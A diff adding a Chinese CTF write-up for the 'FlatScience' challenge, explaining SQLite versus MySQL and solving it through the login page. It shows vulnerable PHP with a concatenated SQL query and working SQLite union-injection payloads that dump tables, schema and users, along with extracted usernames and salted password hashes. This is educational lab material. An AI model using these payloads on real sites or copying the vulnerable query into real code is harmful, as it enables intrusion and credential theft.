@@ -4698,6 +4698,101 @@ http://61.147.171.105:59629/{{''[request.args.a][request.args.b][2][request.args
 
 **使用`[]`就不需要使用`.`**
 
+## 攻防世界 FlatScience
+
+查看`robots.txt`文件可以看到提示网站
+
+![image-20240125184543219](CTF.assets/image-20240125184543219.png)
+
+查看`/admin.php`的注释说的是，不要尝试对这个页面进行绕过
+
+<img src="CTF.assets/image-20240125184637145.png" alt="image-20240125184637145" style="zoom:50%;" />
+
+查看`/login.php`注释，提示加上一个`debug`参数，
+
+![image-20240125184932836](CTF.assets/image-20240125184932836.png)
+
+在第8行确实存在SQL注入漏洞，但是这里用的是：`sqlite`数据库而不是`mysql`数据库，所以注入的payload会有所不同
+
+```php
+<?php
+if(isset($_POST['usr']) && isset($_POST['pw'])){
+        $user = $_POST['usr'];
+        $pass = $_POST['pw'];
+
+        $db = new SQLite3('../fancy.db');
+        
+        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
+    if($res){
+        $row = $res->fetchArray();
+    }
+    else{
+        echo "<br>Some Error occourred!";
+    }
+
+    if(isset($row['id'])){
+            setcookie('name',' '.$row['name'], time() + 60, '/');
+            header("Location: /");
+            die();
+    }
+
+}
+
+if(isset($_GET['debug']))
+highlight_file('login.php');
+?>
+```
+
+### 1，什么是sqlite数据库：
+
+SQLite的是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite的本身是Ç写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的应用中使用。
+
+SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库一样，您不需要在系统中配置。
+
+就像其他数据库，SQLite 引擎不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite 直接访问其存储文件。
+
+### 2，sqlite和 mysql的不同：
+
+熟悉MySQL数据库的人都知道，MySQL中有一个名为information_schema的系统库，里面包含了所有MYSQL数据库中库名，表名，列名的信息，那么SQLITE数据库有没有呢？
+答案当然是没有的。对于SQLITE而言，并没有库的概念，而是直接对象就是表了，所以SQLITE没有系统库，但是它是存在系统表的，这个表名为sqlite_master
+
+简单来说，SQLITE功能简约，小型化，追求最大磁盘效率；MYSQL功能全面，综合化，追求最大并发效率。如果只是单机上用的，数据量不是很大，需要方便移植或者需要频繁读/写磁盘文件的话，就用SQLite比较合适；如果是要满足多用户同时访问，或者是网站访问量比较大是使用MYSQL比较合适。
+**sqlite是没有数据库的概念的，直接面向的是多张数据表**
+
+<img src="CTF.assets/image-20240125185234616.png" alt="image-20240125185234616" style="zoom:80%;" />
+
+这里经过测试，union联合注入是可用的，那么按照上面的提示照着填就 可以了
+
+```
+爆表：
+123'+union+select+1,group_concat(tbl_name)+from+sqlite_master+where+type='table'--+
+
+爆字段：
+usr=123'+union+select+1,sql+from+sqlite_master+where+type='table'+and+tbl_name='Users'--+&pw=123
+
+托库：
+usr=123'+union+select+1,group_concat(name)+from+Users--+&pw=123
+```
+
+这里说一下啊，读源码可以看到，PHP会将`name`字段的值写入`cookie`中，那么回显位就在cookie上面
+
+![image-20240125185555632](CTF.assets/image-20240125185555632.png)
+
+最后得到的结果如下：
+
+```
+表结构：
+CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255))
+
+username：admin,fritze,hansi
+
+password：3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd
+
+hint：my fav word in my fav paper? !,my love is…?, the password is password;
+```
+
+在源码上面可以知道，密码的加密方法：`sha1($pass."Salz!")`，解密方法是：将上面的所有pdf文件下载下来并计算逐个单词，以`单词+Salz！`
+
 
 
 # Misc
